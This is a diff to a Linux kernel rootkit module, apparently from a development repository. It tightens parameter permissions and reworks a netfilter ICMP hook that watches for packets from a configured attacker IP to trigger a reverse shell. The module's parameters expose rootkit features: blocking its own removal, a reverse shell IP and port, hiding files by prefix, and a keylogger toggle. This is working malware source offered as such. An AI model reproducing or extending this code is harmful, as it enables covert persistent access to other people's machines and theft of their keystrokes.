@@ -72,25 +72,25 @@ typedef struct action_task {
 #define MAGIC_ROOT_NUM 31337
 #define MAX_TASK_SIZE 200
 static _timer polling_timer;
-static struct nf_hook_ops icmp_hook;
+static struct nf_hook_ops* icmp_hook = NULL;
 
 // Module parameters
 
 static bool block_removal = false;
-module_param(block_removal, bool, 0770);
+module_param(block_removal, bool, 0660);
 MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
 static char* rev_shell_ip = NULL;
-module_param(rev_shell_ip, charp, 0770);
+module_param(rev_shell_ip, charp, 0660);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
 static char* rev_shell_port = NULL;
-module_param(rev_shell_port, charp, 0770);
+module_param(rev_shell_port, charp, 0660);
 MODULE_PARM_DESC(rev_shell_ip, "Port for reverse shell.");
 // TODO: Convert to array of strings.
 static char* hidden_file_prefix = NULL;
-module_param(hidden_file_prefix, charp, 0770);
+module_param(hidden_file_prefix, charp, 0660);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
 static bool keylogger = false;
-module_param(keylogger, bool, 0770);
+module_param(keylogger, bool, 0660);
 MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
 
 /**
@@ -343,13 +343,13 @@ unsigned int icmp_hook_func(void* priv, struct sk_buff *skb, const struct nf_hoo
 	ip_header = (struct iphdr *) skb_network_header(skb);
 	// If it's an ICMP packet coming from the IP address entered during config,
 	// we should open a reverse shell.
-	if (ip_header->protocol == IPPROTO_ICMP) { 
+	if (ip_header->protocol == IPPROTO_ICMP) {
 		char source_ip[16];
 		printk(KERN_EMERG "%pI4", &ip_header->saddr);
 		snprintf(source_ip, 16, "%pI4", &ip_header->saddr);
 
 		if (!strncmp(source_ip, rev_shell_ip, 16)) {
-			printk(KERN_EMERG "Reverse shell request found!\n"); 
+			printk(KERN_EMERG "Reverse shell request found!\n");
 		}
 	}
 
@@ -357,14 +357,18 @@ unsigned int icmp_hook_func(void* priv, struct sk_buff *skb, const struct nf_hoo
 }
 
 static void icmp_hook_init(void) {
-	icmp_hook.hook = icmp_hook_func;
-    icmp_hook.pf = PF_INET; // Filter by IPV4 packets
-	icmp_hook.hooknum = 0; // Hook ICMP request
-	icmp_hook.priority = NF_IP_PRI_FIRST; // See packets before every other hook function
+	icmp_hook = kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 
-    if (nf_register_net_hook(NULL, &icmp_hook)) {
-    	printk(KERN_ERR "Some issue registering net hook.\n");	
-    }
+	icmp_hook->hook = icmp_hook_func;
+    icmp_hook->pf = PF_INET; // Filter by IPV4 protocol family.
+	icmp_hook->hooknum = 0; // Hook ICMP request
+	icmp_hook->priority = NF_IP_PRI_FIRST; // See packets before every other hook function
+
+    if (nf_register_net_hook(&init_net, icmp_hook)) {
+    	printk(KERN_ERR "There was an issue registering ICMP hook.\n");
+    } else {
+		printk(KERN_ERR "Registered ICMP hook.\n");
+	}
 }
 
 /**
@@ -398,7 +402,8 @@ static int __init rootkit_init(void) {
 static void __exit rootkit_exit(void) {
 	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
 	khook_cleanup();
-	nf_unregister_net_hook(NULL, &icmp_hook);
+	nf_unregister_net_hook(&init_net, icmp_hook);
+	kfree(icmp_hook);
 	timer_cleanup_wrapper(&polling_timer);
 }
 
